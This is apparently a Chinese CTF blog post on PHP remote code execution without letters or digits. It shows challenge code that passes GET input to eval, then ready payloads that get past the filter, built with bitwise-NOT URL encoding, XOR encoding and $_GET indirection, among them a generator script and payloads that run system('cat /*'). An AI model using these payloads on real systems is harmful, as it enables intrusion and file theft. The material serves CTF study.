---
title: 浅谈无字母数字RCE
date: 2026-01-07 15:52:36
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/6961081614866864fecd3f45.png
categories: CTF
---

## 引子

```php
<?php
highlight_file(__FILE__);

$Pr0 = $_GET['Pr0'];
if(preg_match("/[A-Za-z0-9]+/",$Pr0)){
    die("我不喜欢字母和数字！！！");
}
@eval($Pr0);
?>
```

## url取反绕过（PHP7）

```php
<?php
	echo urlencode(~'system');//%8C%86%8C%8B%9A%92
    echo urlencode(~'cat /*');//%9C%9E%8B%DF%D0%D5
```

**按位取反** 是将一个数的每一位二进制位 0 变 1、1 变 0

字符串取反后变成不可打印字符，但可以进行url编码，以此绕过过滤

但是这里关键的是payload

```url
?Pr0=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%D5); 
```

为什么后面的参数不需要用括号和引号包裹，自己加上反而出错？

payload经过url解码以及取反后变成

```bash
("system")("cat /*");
```

在 PHP 中，**如果一个变量的值是字符串，且该字符串是一个已存在的函数名，那么可以用 `$func()` 的方式调用它**，所以上面的代码完全合法。

而自己手动加上双引号，经解码后变为

```
(～"\x8C\x86\x8C\x8B\x9A\x92")("～"\x9C\x9E\x8B\xDF\xD0\xD5"");
```

后面的~运算变成了字符串，不会进行取反操作！

## 异或绕过

我们可以通过一些不可见字符进行异或运算得到我们的字母（例如s=urldecode(%08)^urldecode(%7b)）

先生成一个字典

```php
<?php
$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 
 
		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)^urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}
 
}
}
fwrite($myfile,$contents);
fclose($myfile);
```

再生成payload

```python
import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("xor_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"^\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

![](https://pic1.imgdb.cn/item/695f05c0c1cee4b048c6a9ad.png)

还有两种payload

```
?Pr0=(%27%0C%06%0C%0B%1A%12%27^%27%7F%7F%7F%7F%7F%7F%27)(${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0});&%A0=cat%20/*
//system(_GET[...]);
```

```
?Pr0=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=system&__=cat%20/*
```

## 长度限制

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>40){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```

有长度限制，正常取反异或肯定是超了

这里尝试构造一个传参

```php
<?php
    echo "`{{{"^"?<>/";//_GET
```

```php
<?php
    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
```

![](https://pic1.imgdb.cn/item/697f17b11535a8fb9d25ce40.png)

## Revenge

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

//flag in flag.php

$code = $_GET['c2n_y2u c@ptu3e.+the[f!a&?'];

if(preg_match("/[A-Za-z0-9]+/", $code)){
    die("hacker!");
}

if(strlen($code) > 14){
    die("toooooo looooog!");
}

@eval($code);
?>
```

这个暂时还没想出来怎么做

## 参考文献及其他方法

[简单看看无字母数字RCE](https://err0r233.github.io/posts/47468.html)
